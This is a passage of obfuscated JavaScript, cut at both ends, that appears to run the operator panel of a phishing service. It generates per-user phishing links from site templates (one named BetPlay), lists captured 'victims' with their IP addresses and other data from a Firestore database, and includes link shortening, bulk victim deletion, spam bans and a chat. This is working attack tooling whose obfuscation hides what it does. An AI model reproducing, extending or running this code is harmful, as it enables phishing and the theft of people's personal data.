_0xfa3bd6=document[_0x2aea32(0x389)](_0x2aea32(0x37d));_0xfa3bd6&&(_0xfa3bd6[_0x2e7fcc(0x1be)]=!![],_0xfa3bd6[_0x2aea32(0x36a)][_0x2e7fcc(0x2f5)]=_0x2e7fcc(0x360)),document[_0x2aea32(0x2a5)](_0x2aea32(0x22e))[_0x2aea32(0x28c)](_0x936b60=>{const _0x24bbe2=_0x2e7fcc,_0x128a6d=_0x2aea32;_0x936b60[_0x128a6d(0x31b)]=!![],_0x936b60[_0x24bbe2(0x288)][_0x128a6d(0x2df)]=_0x128a6d(0x23d);}),mostrarAvisoSpam(!![],Math[_0x2aea32(0x363)]((banUntil-Date[_0x2aea32(0x263)]())/(0x16d*0x18*0x36ee80)));}function enableUI(){const _0x4aa168=_0x2ea4a7,_0x3705da=_0x39f624,_0x139c3a=_0xe1859b;$id(_0x139c3a(0x220))[_0x139c3a(0x31b)]=![],$id(_0x139c3a(0x220))[_0x4aa168(0x317)][_0x139c3a(0x2df)]='1',$id(_0x139c3a(0x28e))[_0x139c3a(0x31b)]=![],$id(_0x3705da(0x1b5))['style'][_0x139c3a(0x312)]=_0x139c3a(0x203),$id('fakeSelect')[_0x139c3a(0x36a)][_0x139c3a(0x2df)]='1';const _0x50c351=document[_0x139c3a(0x389)](_0x139c3a(0x37d));_0x50c351&&(_0x50c351[_0x139c3a(0x31b)]=![],_0x50c351[_0x139c3a(0x36a)][_0x139c3a(0x2df)]='1'),document[_0x139c3a(0x2a5)](_0x139c3a(0x22e))[_0x139c3a(0x28c)](_0x5c9d71=>{const _0x1934bd=_0x139c3a;_0x5c9d71[_0x1934bd(0x31b)]=![],_0x5c9d71[_0x1934bd(0x36a)][_0x1934bd(0x2df)]='1';}),mostrarAvisoSpam(![]);}function _0x3377(){const _0x37a9bd=_0x2ea4a7,_0x44a863=_0x39f624,_0x15f76d=[_0x44a863(0x37b),'Phishing',_0x44a863(0x214),_0x44a863(0x307),_0x44a863(0x259),_0x44a863(0x25f),_0x44a863(0x228),_0x44a863(0x222),_0x44a863(0x2e5),_0x44a863(0x236),_0x44a863(0x1bc),_0x44a863(0x289),_0x37a9bd(0x289),_0x44a863(0x22c),_0x37a9bd(0x183),_0x37a9bd(0x194),_0x44a863(0x213),_0x37a9bd(0x245),_0x44a863(0x36a),_0x44a863(0x1b0),_0x44a863(0x245),_0x44a863(0x295),_0x37a9bd(0x28f),_0x44a863(0x2d2),_0x44a863(0x23f),_0x44a863(0x247),_0x44a863(0x1fb),_0x44a863(0x1d1),_0x44a863(0x2d7),_0x44a863(0x334),_0x44a863(0x1dd),_0x44a863(0x1f8),_0x44a863(0x35e),_0x44a863(0x1b5),_0x44a863(0x2c8),_0x44a863(0x272),_0x44a863(0x30b),_0x44a863(0x306),_0x44a863(0x29d),_0x37a9bd(0x1a5),_0x44a863(0x2a4),_0x44a863(0x1a8),_0x44a863(0x1d5),_0x44a863(0x341),_0x44a863(0x1c2),_0x44a863(0x1f5),_0x44a863(0x302),_0x44a863(0x32a),_0x44a863(0x209),_0x44a863(0x33d),_0x44a863(0x296),_0x44a863(0x2db),_0x44a863(0x280),_0x44a863(0x237),_0x44a863(0x2ef),_0x44a863(0x300),_0x44a863(0x2ed),_0x44a863(0x1e6),_0x44a863(0x2bc),_0x44a863(0x1e4),_0x44a863(0x1de),_0x44a863(0x255),_0x44a863(0x1a7),_0x44a863(0x2cd),_0x44a863(0x2f3),_0x44a863(0x29f),_0x44a863(0x314),_0x44a863(0x262),_0x44a863(0x26f),_0x44a863(0x230),_0x44a863(0x215),_0x44a863(0x357),_0x44a863(0x33a),_0x44a863(0x2e4),_0x44a863(0x1ae),_0x37a9bd(0x309),_0x44a863(0x297),_0x44a863(0x371),'https://i.postimg.cc/90W9HPJK/4b77e726b288a4d816cb2e3c194b8954.jpg',_0x44a863(0x34b),_0x44a863(0x1da),_0x44a863(0x24b),_0x44a863(0x2c7),_0x44a863(0x2d6),_0x44a863(0x248),_0x44a863(0x2f5),_0x37a9bd(0x2da),_0x44a863(0x1ab),_0x44a863(0x1ca),_0x44a863(0x234),'https://i.postimg.cc/28W19Kkz/757aab31c810686b617bc58d4285ad8e.jpg',_0x44a863(0x1c8),_0x44a863(0x2ff),_0x44a863(0x277),_0x37a9bd(0x1fc),_0x44a863(0x305),_0x44a863(0x324),_0x44a863(0x291),_0x44a863(0x244),_0x44a863(0x365),_0x44a863(0x2b9),_0x44a863(0x1cd),_0x44a863(0x326),_0x44a863(0x328),_0x44a863(0x1bd),_0x44a863(0x33b),_0x44a863(0x21f),_0x37a9bd(0x31c),_0x44a863(0x298),_0x44a863(0x1b3),_0x37a9bd(0x33b),_0x44a863(0x1ea),_0x44a863(0x294),_0x44a863(0x1d2),_0x44a863(0x346),_0x37a9bd(0x21d),_0x44a863(0x304),_0x44a863(0x2c2),_0x44a863(0x1fe),'</button>',_0x37a9bd(0x1d3),_0x44a863(0x2c6),_0x44a863(0x375),_0x44a863(0x338),_0x44a863(0x253),_0x44a863(0x374),_0x44a863(0x1aa),_0x37a9bd(0x17f),_0x44a863(0x32f),_0x44a863(0x2de),_0x44a863(0x378),_0x44a863(0x1ce),_0x44a863(0x252),_0x44a863(0x219),_0x44a863(0x27e),_0x44a863(0x28a),_0x44a863(0x216),_0x37a9bd(0x326),_0x37a9bd(0x312),_0x44a863(0x32d),_0x44a863(0x2e8),_0x44a863(0x1e1),_0x44a863(0x2a1),_0x44a863(0x316),_0x44a863(0x24a),_0x44a863(0x1be),_0x44a863(0x2ee),_0x44a863(0x309),_0x44a863(0x333),_0x44a863(0x311),_0x44a863(0x25d),_0x44a863(0x30a),_0x44a863(0x270),_0x37a9bd(0x1a7),_0x44a863(0x1af),_0x44a863(0x22a),_0x44a863(0x1ee),_0x44a863(0x376),_0x44a863(0x1d3),_0x44a863(0x310),_0x37a9bd(0x236),_0x44a863(0x27f),'getItem','cursor',_0x44a863(0x24d),'Número:\x20<b\x20style=\x22color:#0ff\x22>',_0x44a863(0x2ad),_0x37a9bd(0x1e3),_0x44a863(0x1c9),_0x44a863(0x323),_0x44a863(0x285),_0x44a863(0x329),_0x44a863(0x221),_0x44a863(0x327),_0x44a863(0x2da),_0x44a863(0x235),_0x44a863(0x232),_0x44a863(0x2dd),_0x44a863(0x243),_0x37a9bd(0x331),_0x44a863(0x2be),_0x37a9bd(0x18b),_0x44a863(0x23c),_0x44a863(0x2b2),_0x44a863(0x2fb),_0x44a863(0x319),_0x44a863(0x318),_0x44a863(0x1c4),_0x44a863(0x380),_0x44a863(0x1bf),_0x44a863(0x2f2),_0x44a863(0x1c3),_0x44a863(0x372),_0x44a863(0x37f),_0x44a863(0x359),_0x44a863(0x2ba),_0x37a9bd(0x1b8),_0x37a9bd(0x232),_0x37a9bd(0x1d2),_0x44a863(0x1f6),_0x44a863(0x321),_0x44a863(0x30d),_0x44a863(0x240),_0x37a9bd(0x272),_0x44a863(0x263),_0x44a863(0x36c),_0x37a9bd(0x337),_0x44a863(0x313),'mostrarCopiadoAcortador',_0x44a863(0x25e),'BetPlay',_0x44a863(0x1f9),_0x44a863(0x315),_0x37a9bd(0x21f),_0x37a9bd(0x1bd),_0x44a863(0x218),_0x44a863(0x2f4),_0x37a9bd(0x172),_0x37a9bd(0x339),_0x44a863(0x24c),_0x44a863(0x21a),'%29',_0x44a863(0x1cb),_0x37a9bd(0x256),_0x44a863(0x288),_0x44a863(0x1d4),_0x44a863(0x27a),'contains',_0x44a863(0x1d0),_0x37a9bd(0x20f),_0x44a863(0x281),_0x44a863(0x31d),_0x44a863(0x249),_0x44a863(0x2ce),_0x44a863(0x2a2),_0x44a863(0x1b4),'createElement','Todas\x20las\x20víctimas\x20han\x20sido\x20eliminadas.',_0x44a863(0x23a),_0x44a863(0x36f),_0x44a863(0x35f),_0x44a863(0x260),_0x44a863(0x1fd),_0x44a863(0x1df),_0x44a863(0x339),_0x44a863(0x2a6),_0x44a863(0x2d4),_0x44a863(0x292),_0x44a863(0x337),_0x44a863(0x1e0),_0x37a9bd(0x29f),'userChatStates',_0x44a863(0x224),_0x44a863(0x32b),_0x44a863(0x239),_0x44a863(0x26d),_0x37a9bd(0x279),_0x44a863(0x2d5),_0x44a863(0x1d8),_0x44a863(0x31a),'chatInput',_0x44a863(0x20a),_0x37a9bd(0x324),_0x44a863(0x2ec),_0x44a863(0x348),_0x44a863(0x271),_0x44a863(0x21b),_0x44a863(0x233),_0x44a863(0x2d0),_0x44a863(0x31e),_0x44a863(0x258),_0x44a863(0x322),_0x44a863(0x2c9),_0x44a863(0x226),_0x44a863(0x2ea),_0x44a863(0x211),_0x44a863(0x229),_0x44a863(0x1b8),_0x37a9bd(0x228),_0x37a9bd(0x25f),_0x44a863(0x2b7),_0x44a863(0x1b7),_0x44a863(0x1ad),_0x44a863(0x210),_0x37a9bd(0x2d8),_0x37a9bd(0x1b5),_0x44a863(0x312),_0x44a863(0x23e),_0x44a863(0x2e6),_0x44a863(0x343),_0x44a863(0x2b4),_0x37a9bd(0x181),_0x37a9bd(0x2f7),_0x44a863(0x22e),_0x37a9bd(0x2aa),_0x44a863(0x367),_0x44a863(0x21d),_0x44a863(0x364),_0x37a9bd(0x327),_0x44a863(0x278),'errormessage',_0x37a9bd(0x257),_0x44a863(0x1c0),_0x44a863(0x2af),'No\x20hay\x20usuario\x20autenticado\x20para\x20el\x20chat.',_0x44a863(0x32e),_0x44a863(0x1c6),_0x44a863(0x24f),_0x44a863(0x28f),_0x37a9bd(0x1d0),_0x44a863(0x2f0),_0x44a863(0x325),_0x44a863(0x2e7),_0x44a863(0x28c),_0x37a9bd(0x23c),_0x44a863(0x31b),_0x44a863(0x34e),'@keyframes\x20parpadeo\x20{\x200%,100%\x20{\x20opacity:1\x20}\x2050%\x20{\x20opacity:0.5\x20}\x20}',_0x37a9bd(0x30d),_0x44a863(0x2e0),_0x44a863(0x2df),_0x44a863(0x1db),_0x44a863(0x37a),_0x44a863(0x2a7),_0x44a863(0x317),_0x44a863(0x208),_0x44a863(0x2dc),_0x44a863(0x287),_0x44a863(0x1ed),_0x44a863(0x24e),_0x44a863(0x358),_0x44a863(0x267),_0x44a863(0x2a9),_0x44a863(0x1f4),_0x44a863(0x1c7),_0x44a863(0x242),'tema-',_0x44a863(0x20e),_0x37a9bd(0x220),_0x37a9bd(0x16a),_0x44a863(0x264),_0x44a863(0x33c),_0x44a863(0x2cc),'search',_0x44a863(0x25a),_0x44a863(0x37c),_0x44a863(0x31c),_0x44a863(0x29a),_0x44a863(0x276),'auto',_0x44a863(0x1ff),_0x44a863(0x2e9),_0x44a863(0x351),_0x44a863(0x1eb),_0x37a9bd(0x217),_0x44a863(0x344),_0x44a863(0x20b),_0x44a863(0x377),_0x44a863(0x345),_0x44a863(0x21c),_0x37a9bd(0x1e8),_0x44a863(0x2ac),_0x37a9bd(0x2af),_0x44a863(0x20f),_0x44a863(0x23b),_0x44a863(0x308),_0x44a863(0x26c),_0x37a9bd(0x19d),_0x44a863(0x30e),_0x44a863(0x2f7),_0x44a863(0x2a3),_0x44a863(0x2b1),_0x44a863(0x284),_0x44a863(0x1f1),_0x44a863(0x238),_0x44a863(0x26a),_0x44a863(0x23d),_0x37a9bd(0x2c8),_0x44a863(0x29b),_0x44a863(0x273),_0x44a863(0x2eb),_0x44a863(0x286),_0x44a863(0x356),_0x37a9bd(0x1ef),_0x44a863(0x30f),'innerHTML',_0x37a9bd(0x231),_0x44a863(0x1e2),_0x44a863(0x283),_0x44a863(0x369),_0x44a863(0x29c),_0x37a9bd(0x266),_0x44a863(0x27c),_0x37a9bd(0x2b1),'mostrarOcultarImagenesFondoEnlaces',_0x44a863(0x251),_0x44a863(0x2ab),_0x44a863(0x332),_0x44a863(0x2fd),_0x44a863(0x36e),_0x37a9bd(0x1f8),_0x44a863(0x2ca),_0x44a863(0x2e2),_0x44a863(0x361),_0x44a863(0x2cb),_0x44a863(0x257),'tema-darkwave','0.5',_0x44a863(0x36b),_0x44a863(0x28e),_0x44a863(0x2e1),_0x44a863(0x2fa),_0x37a9bd(0x1ed),_0x44a863(0x1ef),_0x44a863(0x2ae),_0x44a863(0x26e),_0x44a863(0x1e7),'restaurarTemaOriginal',_0x44a863(0x200),_0x44a863(0x36d),_0x44a863(0x1d6),_0x44a863(0x1cc),_0x44a863(0x2f1),_0x44a863(0x379),_0x44a863(0x293),_0x44a863(0x282),_0x37a9bd(0x2ff),_0x37a9bd(0x2fc),_0x44a863(0x1a9),_0x44a863(0x349),_0x44a863(0x204),_0x37a9bd(0x18c),_0x44a863(0x370),_0x44a863(0x1d9),_0x44a863(0x2cf),_0x44a863(0x275),_0x44a863(0x35b),_0x37a9bd(0x2f0),_0x44a863(0x2b0),_0x44a863(0x320),_0x44a863(0x2d3),_0x44a863(0x32c),_0x44a863(0x363),_0x44a863(0x269),_0x44a863(0x225),_0x37a9bd(0x1b4),_0x44a863(0x31f),_0x44a863(0x35c),_0x37a9bd(0x28e),_0x44a863(0x274),_0x44a863(0x2c4),_0x44a863(0x347),_0x37a9bd(0x295),_0x44a863(0x1ba),_0x44a863(0x366),_0x37a9bd(0x1c3),_0x44a863(0x2b3),_0x44a863(0x1ec),_0x37a9bd(0x2ab),_0x44a863(0x335),_0x37a9bd(0x1e2),'https://i.postimg.cc/3RK3WZJw/images-(26).jpg',_0x44a863(0x1f2),_0x44a863(0x290),_0x44a863(0x1c1),_0x44a863(0x25c),_0x44a863(0x2a8),_0x44a863(0x21e),_0x44a863(0x355),_0x44a863(0x26b),_0x37a9bd(0x1c7),_0x44a863(0x2a0),_0x37a9bd(0x2e2),_0x44a863(0x2fe),_0x44a863(0x2f9),_0x44a863(0x1a6),_0x44a863(0x2bb),_0x44a863(0x2e3),_0x44a863(0x27b),_0x44a863(0x266),_0x37a9bd(0x285),_0x44a863(0x2b6),_0x44a863(0x231),_0x37a9bd(0x1f3)];return _0x3377=function(){return _0x15f76d;},_0x3377();}onAuthStateChanged(auth,async _0x1a4beb=>{const _0x526d64=_0x2ea4a7,_0x2f48e7=_0xe1859b;if(!_0x1a4beb){location[_0x2f48e7(0x21d)](_0x526d64(0x267));return;}localStorage[_0x2f48e7(0x279)](_0x2f48e7(0x201),_0x1a4beb[_0x2f48e7(0x2cf)]);if($id(_0x2f48e7(0x268)))$id(_0x2f48e7(0x268))[_0x2f48e7(0x229)]=_0x1a4beb[_0x526d64(0x30a)];miUserDocId=_0x1a4beb[_0x2f48e7(0x31c)],miLinkId=_0x1a4beb['uid'];const _0x35f3e2=doc(db,_0x2f48e7(0x2b0),miUserDocId);onSnapshot(_0x35f3e2,_0x5cec10=>{const _0x3708ad=_0xc57b,_0x5505f9=_0x2f48e7;if(_0x5cec10[_0x5505f9(0x1be)]()){const _0x4b9607=_0x5cec10[_0x5505f9(0x291)](),_0x1d5500=Date[_0x5505f9(0x263)]();_0x4b9607[_0x5505f9(0x358)]&&_0x4b9607[_0x5505f9(0x358)][_0x3708ad(0x327)]()>_0x1d5500?!isBanned&&(isBanned=!![],banUntil=_0x4b9607[_0x5505f9(0x358)][_0x5505f9(0x337)](),disableUI(),mostrarModalSpamBloqueado(Math[_0x5505f9(0x363)]((banUntil-_0x1d5500)/(0x16d*0x18*0x36ee80)))):isBanned&&(isBanned=![],enableUI());}}),generarEnlacesUnicos(),iniciarListenerVictimas(),actualizarOnline(),iniciarChat(),iniciarLluviaBinaria(),cargarFondosGuardados(),await cargarUltimoCambioNombre();});const plantillas=[{'nombre':_0xe1859b(0x345),'url':_0xe1859b(0x31f)},{'nombre':_0xe1859b(0x307),'url':_0xe1859b(0x1ea)},{'nombre':_0xe1859b(0x26c),'url':_0xe1859b(0x238)},{'nombre':_0xe1859b(0x1b3),'url':_0x39f624(0x1fc)},{'nombre':_0x39f624(0x241),'url':_0xe1859b(0x24a)},{'nombre':_0x39f624(0x22f),'url':_0xe1859b(0x23f)},{'nombre':_0x39f624(0x383),'url':_0x39f624(0x336)},{'nombre':_0xe1859b(0x29d),'url':_0x39f624(0x2f8)},{'nombre':_0xe1859b(0x228),'url':_0xe1859b(0x360)},{'nombre':_0xe1859b(0x275),'url':_0xe1859b(0x267)},{'nombre':_0xe1859b(0x306),'url':_0xe1859b(0x285)},{'nombre':_0xe1859b(0x26d),'url':_0xe1859b(0x2a8)},{'nombre':_0xe1859b(0x287),'url':_0x2ea4a7(0x336)},{'nombre':_0xe1859b(0x35c),'url':_0xe1859b(0x2de)},{'nombre':_0xe1859b(0x1ef),'url':_0xe1859b(0x2ac)},{'nombre':_0xe1859b(0x200),'url':_0xe1859b(0x25b)},{'nombre':_0xe1859b(0x2eb),'url':_0xe1859b(0x371)},{'nombre':_0xe1859b(0x21b),'url':_0xe1859b(0x23b)},{'nombre':_0xe1859b(0x22f),'url':_0xe1859b(0x206)},{'nombre':_0x39f624(0x217),'url':_0xe1859b(0x299)},{'nombre':_0xe1859b(0x1ae),'url':_0x39f624(0x1fa)}];function _0x56f7(_0x4a8da6,_0x523e7d){_0x4a8da6=_0x4a8da6-0x1a8;const _0x5e817a=_0x3377();let _0x1314ff=_0x5e817a[_0x4a8da6];return _0x1314ff;}function generarEnlacesUnicos(){const _0x29055d=_0x2ea4a7,_0x3f2b3a=_0x39f624,_0x18bd73=_0xe1859b,_0x283fd8=$id(_0x18bd73(0x2ab)),_0x375760=$id(_0x18bd73(0x20b));_0x283fd8[_0x18bd73(0x229)]=_0x3f2b3a(0x28b),_0x283fd8[_0x18bd73(0x1fa)][_0x18bd73(0x328)]='',_0x375760[_0x3f2b3a(0x2bf)]='',plantillas[_0x29055d(0x2f9)](_0x15b297=>{const _0x4eb486=_0x29055d,_0xc2b1b8=_0x3f2b3a,_0x96c703=_0x18bd73,_0x545f07=_0x15b297[_0xc2b1b8(0x1d3)]+_0x96c703(0x1fb)+miLinkId,_0x316feb=document[_0x4eb486(0x2be)](_0x96c703(0x282));_0x316feb[_0x96c703(0x2e1)]=_0x96c703(0x245),_0x316feb[_0xc2b1b8(0x1e2)]=_0x15b297[_0x96c703(0x33c)],_0x316feb[_0x96c703(0x2d6)]=()=>{const _0x188c13=_0x4eb486,_0x561988=_0xc2b1b8,_0x1565b9=_0x96c703;_0x283fd8[_0x1565b9(0x229)]=_0x15b297[_0x1565b9(0x33c)],_0x283fd8[_0x561988(0x264)][_0x188c13(0x250)]=_0x545f07,_0x375760[_0x1565b9(0x36a)][_0x1565b9(0x2a4)]=_0x1565b9(0x277);},_0x375760[_0x4eb486(0x261)](_0x316feb);}),_0x283fd8[_0x18bd73(0x2d6)]=()=>_0x375760[_0x18bd73(0x36a)][_0x18bd73(0x2a4)]=_0x375760[_0x18bd73(0x36a)][_0x3f2b3a(0x1fb)]===_0x18bd73(0x381)?_0x18bd73(0x277):_0x18bd73(0x381);}document[_0xe1859b(0x38b)](_0xe1859b(0x347),_0x35c268=>{const _0x23502c=_0x2ea4a7,_0x407680=_0xe1859b;!$id(_0x407680(0x2ab))?.[_0x407680(0x36d)](_0x35c268[_0x407680(0x28a)])&&!$id(_0x407680(0x20b))?.[_0x407680(0x36d)](_0x35c268[_0x407680(0x28a)])&&($id(_0x407680(0x20b))[_0x407680(0x36a)][_0x23502c(0x2c1)]=_0x407680(0x277));}),window[_0xe1859b(0x34e)]=()=>{const _0x1ec575=_0x2ea4a7,_0x2763c5=_0x39f624,_0x92ffea=_0xe1859b,_0x389b3b=$id(_0x2763c5(0x1b5))[_0x92ffea(0x1fa)][_0x2763c5(0x1d3)]||plantillas[0x0][_0x92ffea(0x328)]+_0x92ffea(0x1fb)+miLinkId;navigator[_0x92ffea(0x27f)][_0x92ffea(0x29b)](_0x389b3b),$id(_0x1ec575(0x249))[_0x92ffea(0x36a)][_0x92ffea(0x2a4)]=_0x92ffea(0x381),setTimeout(()=>$id(_0x92ffea(0x243))[_0x92ffea(0x36a)][_0x92ffea(0x2a4)]=_0x92ffea(0x277),0x7d0);},$id(_0x39f624(0x259))[_0x2ea4a7(0x26a)]=()=>$id(_0x2ea4a7(0x19a))[_0xe1859b(0x36a)][_0xe1859b(0x2a4)]=_0x39f624(0x292),$id(_0x39f624(0x1e8))[_0xe1859b(0x2d6)]=()=>$id(_0x2ea4a7(0x19a))[_0xe1859b(0x36a)][_0x39f624(0x1fb)]=_0xe1859b(0x277),$id(_0xe1859b(0x1b8))[_0xe1859b(0x2d6)]=async()=>{const _0x2e7e3a=_0x2ea4a7,_0x2fd26e=_0x39f624,_0x5bc240=_0xe1859b,_0x114475=$id(_0x2fd26e(0x2aa))[_0x5bc240(0x33f)][_0x5bc240(0x2d2)](),_0x3e0ec1=$id(_0x5bc240(0x219))[_0x5bc240(0x33f)][_0x5bc240(0x2d2)]();if(!_0x114475)return $id(_0x5bc240(0x272))[_0x2fd26e(0x1e2)]=_0x5bc240(0x281);const _0x1dff8a=await fetch(_0x5bc240(0x311)+encodeURIComponent(_0x114475)+(_0x3e0ec1?_0x5bc240(0x1b9)+_0x3e0ec1:'')),_0x2aaa91=await _0x1dff8a[_0x5bc240(0x33d)]();if(_0x2aaa91[_0x5bc240(0x2e9)]){$id(_0x5bc240(0x272))[_0x5bc240(0x227)]=_0x5bc240(0x29a)+_0x2aaa91[_0x2e7e3a(0x2a8)]+_0x5bc240(0x315)+_0x2aaa91[_0x5bc240(0x2e9)]+_0x5bc240(0x1a9);let _0xf43120=JSON[_0x5bc240(0x239)](localStorage[_0x5bc240(0x32c)](_0x2fd26e(0x342))||'[]');_0xf43120[_0x5bc240(0x2af)](_0x2aaa91[_0x2fd26e(0x305)]),localStorage[_0x5bc240(0x279)](_0x5bc240(0x255),JSON[_0x5bc240(0x271)](_0xf43120));}else $id(_0x5bc240(0x272))[_0x2e7e3a(0x1cd)]=_0x2aaa91[_0x5bc240(0x1d2)]||_0x5bc240(0x2f1);},window[_0xe1859b(0x35a)]=()=>{const _0x5683ac=_0x39f624,_0x2dd9c8=_0xe1859b,_0x450a73=document[_0x2dd9c8(0x2a9)](_0x5683ac(0x34a));_0x450a73&&(_0x450a73[_0x2dd9c8(0x36a)][_0x2dd9c8(0x2a4)]=_0x2dd9c8(0x381),setTimeout(()=>_0x450a73[_0x2dd9c8(0x36a)][_0x2dd9c8(0x2a4)]=_0x2dd9c8(0x277),0xbb8));},window[_0x2ea4a7(0x2f8)]=()=>$id(_0xe1859b(0x34b))[_0xe1859b(0x36a)][_0x39f624(0x1fb)]=$id(_0xe1859b(0x34b))[_0x39f624(0x288)][_0xe1859b(0x2a4)]===_0xe1859b(0x381)?_0xe1859b(0x277):_0xe1859b(0x381),window[_0x2ea4a7(0x2ad)]=()=>$id(_0xe1859b(0x25c))[_0xe1859b(0x36a)][_0x39f624(0x1fb)]=$id(_0xe1859b(0x25c))[_0x39f624(0x288)][_0x39f624(0x1fb)]===_0xe1859b(0x381)?_0x39f624(0x25c):_0xe1859b(0x381),window[_0xe1859b(0x20c)]=()=>$id(_0xe1859b(0x20d))[_0x39f624(0x282)][_0x39f624(0x1d7)](_0xe1859b(0x224)),window['mostrarMisEnlaces']=()=>{const _0x50a8b8=_0x39f624,_0x6799a6=_0xe1859b,_0x3af36b=JSON[_0x6799a6(0x239)](localStorage[_0x6799a6(0x32c)](_0x6799a6(0x255))||'[]'),_0x4c0851=$id(_0x6799a6(0x29f));_0x4c0851[_0x6799a6(0x227)]=_0x3af36b[_0x6799a6(0x297)]?_0x3af36b[_0x50a8b8(0x1a8)](_0x414f76=>_0x50a8b8(0x1c5)+_0x414f76+_0x6799a6(0x369)+_0x414f76+_0x6799a6(0x231))[_0x6799a6(0x1c8)](''):_0x6799a6(0x33e),$id(_0x6799a6(0x2a3))[_0x6799a6(0x36a)][_0x6799a6(0x2a4)]=_0x6799a6(0x381);},window[_0xe1859b(0x240)]=()=>$id(_0xe1859b(0x2a3))[_0x39f624(0x288)][_0x39f624(0x1fb)]=_0x39f624(0x25c);function iniciarListenerVictimas(){const _0x49c3d5=_0x39f624,_0x47c69d=_0xe1859b;if(!miUserDocId)return;const _0x2644f9=collection(db,_0x47c69d(0x2b0),miUserDocId,_0x49c3d5(0x2ac));onSnapshot(query(_0x2644f9,orderBy(_0x47c69d(0x34a),_0x49c3d5(0x2ad))),mostrarVictimas);}function mostrarVictimas(_0x4a0b85){const _0x53bd1f=_0x2ea4a7,_0xeb729e=_0xe1859b,_0x1f92e8=$id(_0xeb729e(0x25c));if(!_0x1f92e8)return;if(_0x4a0b85[_0xeb729e(0x37f)]){_0x1f92e8[_0xeb729e(0x227)]=_0xeb729e(0x300);return;}let _0x1d9b19=_0xeb729e(0x1ff);_0x4a0b85[_0xeb729e(0x28c)](_0x24ab43=>{const _0x41e2db=_0x382f,_0x15dfe5=_0xc57b,_0x133983=_0xeb729e,_0x5450aa=_0x24ab43[_0x133983(0x291)](),_0x4704fc=_0x5450aa[_0x133983(0x34a)]?new Date(_0x5450aa[_0x15dfe5(0x372)][_0x133983(0x1e2)]())[_0x133983(0x350)]():_0x133983(0x25e),_0x27a8b1=_0x24ab43['id'];_0x1d9b19+=_0x133983(0x2c8),_0x5450aa[_0x41e2db(0x187)]&&(_0x1d9b19+=_0x15dfe5(0x205)+_0x5450aa[_0x41e2db(0x187)]+_0x133983(0x30f)+encodeURIComponent(_0x5450aa[_0x133983(0x374)])+_0x133983(0x209)),_0x1d9b19+=_0x133983(0x1bf)+(_0x5450aa[_0x133983(0x2e5)]||_0x133983(0x28b))+_0x133983(0x349);if(_0x5450aa['ip'])_0x1d9b19+=_0x133983(0x321)+_0x5450aa['ip']+_0x15dfe5(0x27a);if(_0x5450aa[_0x133983(0x2f3)])_0x1d9b19+=_0x133983(0x32f)+_0x5450aa[_0x133983(0x2f3)]+_0x133983(0x36c);if(_0x5450aa[_0x133983(0x269)])_0x1d9b19+=_0x133983(0x2a6)+_0x5450aa[_0x133983(0x269)]+_0x133983(0x36c);if(_0x5450aa[_0x41e2db(0x2e2)])_0x1d9b19+=_0x133983(0x331)+_0x5450aa[_0x133983(0x27e)]+_0x133983(0x36c);_0x1d9b19+=_0x133983(0x293)+_0x4704fc+_0x15dfe5(0x373);}),_0x1d9b19+=_0xeb729e(0x1ab),_0x1f92e8[_0x53bd1f(0x290)]=_0x1d9b19;}window[_0xe1859b(0x322)]=_0x3461e3=>{const _0x386161=_0x39f624,_0x1c31c2=_0xe1859b,_0x1388d5=$id(_0x1c31c2(0x26f)),_0x35fd2f=$id(_0x386161(0x303)),_0xb0aad5=$id(_0x1c31c2(0x25c));_0x35fd2f[_0x1c31c2(0x380)]=decodeURIComponent(_0x3461e3),_0xb0aad5[_0x386161(0x288)][_0x1c31c2(0x2a4)]=_0x1c31c2(0x277),_0x1388d5[_0x1c31c2(0x36a)][_0x1c31c2(0x2a4)]=_0x1c31c2(0x381);},window[_0xe1859b(0x2c2)]=()=>{const _0x4c3888=_0x39f624,_0x4b47f7=_0xe1859b,_0x40cf0f=$id(_0x4b47f7(0x26f)),_0x1262d7=$id(_0x4b47f7(0x25c));_0x40cf0f[_0x4b47f7(0x36a)][_0x4c3888(0x1fb)]=_0x4b47f7(0x277),_0x1262d7[_0x4b47f7(0x36a)][_0x4b47f7(0x2a4)]=_0x4b47f7(0x381);},document[_0xe1859b(0x38b)](_0xe1859b(0x1f9),()=>{const _0x4f7535=_0xe1859b,_0x329c6f=$id(_0x4f7535(0x1f7));_0x329c6f&&_0x329c6f[_0x4f7535(0x38b)](_0x4f7535(0x347),regresarAVictimas);}),window[_0xe1859b(0x2d3)]=async()=>{const _0x24fa7e=_0x2ea4a7,_0xbf7f9f=_0x39f624,_0x10e7d1=_0xe1859b;if(!miUserDocId){mostrarNotif(_0xbf7f9f(0x223)),console['error'](_0x10e7d1(0x222));return;}mostrarModalPro(_0x10e7d1(0x1e4),_0x10e7d1(0x204),_0x24fa7e(0x2cb),_0x10e7d1(0x333),async()=>{const _0x1ee919=_0x24fa7e,_0x10a72b=_0x10e7d1;try{const _0x51a9f3=await getDocs(collection(db,_0x10a72b(0x2b0),miUserDocId,_0x10a72b(0x20f)));if(_0x51a9f3[_0x10a72b(0x37f)]){mostrarNotif(_0x10a72b(0x336));return;}const _0x20f01e=_0x51a9f3[_0x10a72b(0x205)][_0x10a72b(0x2b3)](_0x5655e7=>deleteDoc(_0x5655e7[_0x10a72b(0x207)]));await Promise[_0x10a72b(0x1f1)](_0x20f01e),mostrarNotif(_0x10a72b(0x377));}catch(_0x5bf02d){console[_0x10a72b(0x338)](_0x1ee919(0x1f5),_0x5bf02d),mostrarNotif(_0x10a72b(0x1b1));}});};async function actualizarOnline(){const _0x42c4fc=_0x2ea4a7,_0x15e57c=_0xe1859b;if(!miUserDocId)return;await setDoc(doc(db,_0x15e57c(0x2b0),miUserDocId),{'online':!![],'ultimaActividad':serverTimestamp()},{'merge':!![]});const _0x1ceb1e=query(collection(db,_0x15e57c(0x2b0)),where(_0x42c4fc(0x216),'>=',new Date(Date[_0x15e57c(0x263)]()-0xea60)));onSnapshot(_0x1ceb1e,_0x192c64=>{const _0x1ca1fb=_0x15e57c;if($id(_0x1ca1fb(0x2ae)))$id(_0x1ca1fb(0x2ae))[_0x1ca1fb(0x229)]=_0x192c64[_0x1ca1fb(0x266)];});}setInterval(actualizarOnline,0x2710);function mostrarModalPro(_0x2ef52e,_0x3151a7,_0x3f11de,_0x24e475,_0x359be6){const 